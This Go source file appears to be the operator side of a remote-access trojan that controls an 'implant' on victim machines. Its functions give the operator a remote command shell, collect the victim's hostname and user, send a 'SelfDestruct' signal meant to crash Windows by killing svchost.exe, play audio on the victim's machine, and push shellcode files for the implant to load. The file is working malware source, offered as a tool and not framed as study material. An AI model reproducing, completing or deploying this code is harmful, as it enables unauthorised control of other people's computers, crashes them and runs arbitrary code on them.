package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"time"
)

// Server-Sides needs to handle errors better
func shell(conn *net.Conn) {
	reader := bufio.NewReader(os.Stdin)
L: //Labeled the for loop with L if i need to break it from switch. Faster than if statements. Works.
	for {
		fmt.Print("PS > ")
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading input:", err)
			continue
		}
		switch command {
		case "\n":
			continue
		case "cls\n":
			continue
		case "bg\n":
			break L
		case "exit\n":
			break L
		default:
			(*conn).Write([]byte(command))
			//time.Sleep(1 * time.Second) Ma ila 3azeh only for testing
			request := make([]byte, 9000)
			read_len, err := (*conn).Read(request)
			if read_len == 0 {
				fmt.Println("Read Length is 0")
				os.Exit(0)
			}
			if err != nil {
				os.Exit(0)
			}
			reply := string(request[:read_len])
			fmt.Println(reply)
		}
	}
}

func hostinfo(conn *net.Conn) {
	fmt.Println()
	(*conn).Write([]byte("hostname\n"))
	request := make([]byte, 9000)
	read_len, err := (*conn).Read(request)
	if read_len == 0 {
		fmt.Println("Read Length is 0")
	}
	if err != nil {
		os.Exit(0)
	}
	hostname := string(request[:read_len])
	(*conn).Write([]byte("whoami\n"))
	read_len, err = (*conn).Read(request)
	if read_len == 0 {
		fmt.Println("Read Length is 0")
	}
	if err != nil {
		os.Exit(0)
	}
	whoami := string(request[:read_len])
	fmt.Print("Hostname: " + hostname) //Hostname gets recieved with \n so we can leave it this way
	fmt.Println("User: " + whoami)
}

func bsod(conn *net.Conn) bool { //Works but implant should be running as admin
	// fmt.Println("Initiating BSOD by killing")
	// (*conn).Write([]byte("taskkill.exe /f /im svchost.exe"))
	// fmt.Println("Kill Signal Sent")
	fmt.Println("Initiating BSOD by killing svchost.exe")
	(*conn).Write([]byte("SelfDestruct\n"))
	fmt.Println("Kill Signal Sent")
	reply := make([]byte, 9000)
	(*conn).SetReadDeadline(time.Now().Add(15 * time.Second))

	read_len, err := (*conn).Read(reply)
	if read_len == 0 {
		(*conn).Close()
		return true
	}
	if err != nil {
		(*conn).Close()
		return true
	}
	strReply := string(reply[:read_len])
	if strReply == "NoTime2Die\n" {
		fmt.Println(strReply)
		return false
	}
	return true
}

func playAudio(conn *net.Conn, audioFile string) {
	fmt.Println("Playing audio on the remote host :)")
	contents, err := os.ReadFile("Audio/" + audioFile)
	if err != nil {
		fmt.Println("Couldn't read the file !")
		return
	}
	(*conn).Write([]byte("play\n"))
	(*conn).Write(contents)
}

func load(conn *net.Conn, fileWShellcode string) {
	fmt.Println("Good luck")
	file, err := os.ReadFile("Shellcode/" + fileWShellcode)
	if err != nil {
		fmt.Println("Couldn't read the file !")
		return
	}
	(*conn).Write([]byte("barCode\n"))
	(*conn).Write(file)
}
